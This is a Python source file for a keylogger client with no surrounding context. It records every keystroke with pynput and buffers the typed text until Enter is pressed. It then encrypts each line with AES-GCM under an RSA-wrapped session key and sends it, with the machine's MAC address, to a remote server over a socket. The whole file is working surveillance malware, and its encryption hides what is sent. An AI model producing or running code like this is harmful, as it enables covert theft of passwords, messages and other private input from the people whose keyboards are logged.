# client.py
import socket
import json
import base64
import os
import uuid
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from pynput import keyboard

# Configure the server connection
SERVER_HOST = '127.0.0.1'   # Change to the server's IP as needed
SERVER_PORT = 5000

def send_json(sock, data):
    """Send a JSON message with a 4-byte length prefix."""
    msg = json.dumps(data).encode('utf-8')
    msg = len(msg).to_bytes(4, byteorder='big') + msg
    sock.sendall(msg)

def recv_json(sock):
    """Receive a JSON message that is prefixed with its 4-byte length."""
    raw_length = sock.recv(4)
    if not raw_length:
        return None
    length = int.from_bytes(raw_length, byteorder='big')
    data = b''
    while len(data) < length:
        packet = sock.recv(length - len(data))
        if not packet:
            return None
        data += packet
    return json.loads(data.decode('utf-8'))

def load_server_public_key(path="server_public_key.pem"):
    """Load the server's RSA public key from a PEM file."""
    with open(path, "rb") as key_file:
        public_key = serialization.load_pem_public_key(key_file.read())
    return public_key

# Global variables for the session
aes_key = None
client_socket = None
buffer = ""  # Accumulate keystrokes here

def encrypt_log(log_text):
    """Encrypt log text using AESGCM (AES in GCM mode)."""
    global aes_key
    aesgcm = AESGCM(aes_key)
    nonce = os.urandom(12)  # Recommended nonce length for GCM
    ct = aesgcm.encrypt(nonce, log_text.encode('utf-8'), None)
    encrypted = nonce + ct
    return base64.b64encode(encrypted).decode('utf-8')

def on_press(key):
    """Callback for each key press."""
    global buffer
    try:
        # If the key has a character representation, add it
        buffer += key.char
    except AttributeError:
        # Handle special keys
        if key == keyboard.Key.enter:
            if buffer.strip():  # Only send if the buffer is not empty
                encrypted_data = encrypt_log(buffer)
                msg = {"type": "log", "data": encrypted_data}
                try:
                    send_json(client_socket, msg)
                except Exception as e:
                    print("Failed to send log:", e)
                print("Sent log:", buffer)
            buffer = ""
        elif key == keyboard.Key.backspace:
            buffer = buffer[:-1]
        # (You can extend handling for other keys if desired)

def start_keylogger():
    """Start the keyboard listener."""
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

def main():
    global client_socket, aes_key

    # Connect to the server
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((SERVER_HOST, SERVER_PORT))
    print("Connected to server.")

    # Load the server's public RSA key
    server_pub_key = load_server_public_key()

    # Generate a random 256-bit AES key for this session
    aes_key = AESGCM.generate_key(bit_length=256)

    # Encrypt the AES key with the server's RSA public key (using OAEP padding)
    encrypted_aes_key = server_pub_key.encrypt(
        aes_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    encrypted_aes_key_b64 = base64.b64encode(encrypted_aes_key).decode('utf-8')

    # Get the client's MAC address (formatted as XX:XX:XX:XX:XX:XX)
    mac_int = uuid.getnode()
    mac_str = ':'.join(("%012X" % mac_int)[i:i+2] for i in range(0, 12, 2))

    # Send the initialization message with the MAC address and encrypted AES key
    init_msg = {
        "type": "init",
        "mac": mac_str,
        "encrypted_key": encrypted_aes_key_b64
    }
    send_json(client_socket, init_msg)
    print("Sent init message with MAC:", mac_str)

    # Start the keylogging process (this call will block)
    start_keylogger()

if __name__ == "__main__":
    main()
